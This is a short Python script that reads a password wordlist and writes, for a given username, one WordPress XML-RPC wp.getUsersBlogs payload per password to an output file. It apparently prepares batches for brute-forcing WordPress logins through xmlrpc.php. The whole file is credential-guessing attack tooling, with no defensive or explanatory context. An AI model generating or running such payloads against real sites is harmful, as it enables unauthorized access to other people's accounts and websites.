import sys

USER = str(sys.argv[1])
passread = str(sys.argv[2])
output = str(sys.argv[3])

def doIt(u, p, o):
    
    idx = 0
    payList = []
    with open(passread) as lines:
        passList = lines.read().splitlines()

    for x in passList:
        
        payload = '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+USER+'</string></value><value><string>'+passList[idx]+'</string></value></data></array></value></data></array></value></member></struct></value>'
        blank = '\n'
        payList.append((payload))
        payList.append(blank)
        
        idx = idx + 1
        
    with open (output ,'w') as f:
        for y in payList:
            f.write(f"{y}\n")

doIt(USER,passread,output)

    



